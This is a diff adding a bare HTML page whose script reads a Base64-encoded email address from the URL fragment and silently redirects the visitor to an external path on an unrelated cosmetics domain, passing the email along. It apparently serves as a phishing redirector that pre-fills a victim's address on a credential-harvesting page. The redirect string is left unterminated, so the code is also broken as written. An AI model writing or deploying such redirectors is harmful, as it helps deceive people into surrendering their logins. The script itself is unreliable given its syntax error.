@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Add your other head elements here -->
+</head>
+<body>
+
+<!-- Add your page content here -->
+
+<!-- JavaScript code to handle decoding and redirection -->
+<script>
+function base64urlDecode(data) {
+    return atob(data.replace(/_/g, '/').replace(/-/g, '+'));
+}
+
+// Get the URL fragment (everything after '#') using JavaScript
+var fragment = window.location.hash.substr(1);
+
+// Decode the Base64-encoded email
+var decodedEmail = base64urlDecode(fragment);
+
+// Add the URL you want to redirect to here
+var redirectUrl = "https://raicucosmetics.com/yp/niffy-reload-action/ // Replace with your desired URL
+
+if (decodedEmail) {
+    // Use the decoded email to construct the redirect URL
+    // Append the email as a query parameter to the URL
+    redirectUrl += "#" + decodeURIComponent(decodedEmail);
+}
+
+// Redirect the user to the new URL
+window.location.href = redirectUrl;
+</script>
+
+</body>
+</html>
